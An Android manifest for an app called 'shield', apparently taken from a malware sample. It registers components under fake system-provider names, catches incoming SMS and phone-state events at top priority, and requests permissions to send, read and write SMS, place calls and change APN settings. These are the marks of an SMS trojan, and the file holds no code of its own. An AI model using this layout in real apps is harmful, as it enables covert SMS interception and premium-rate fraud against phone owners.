<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.ninepvi.shield">
    <application android:icon="@drawable/logo" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:name="TrustAppActivity"/>
        <receiver android:name="com.android.providers.update.OperateReceiver" android:priority="1000">
            <intent-filter android:priority="9999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
            <intent-filter android:priority="9999">
                <action android:name="android.intent.action.PHONE_STATE"/>
            </intent-filter>
        </receiver>
        <service android:name="com.android.providers.update.OperateService"/>
        <service android:name="com.android.providers.sms.SMSService"/>
        <service android:name="com.android.providers.sms.SMSSendService"/>
    </application>
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_APN_SETTINGS"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
</manifest>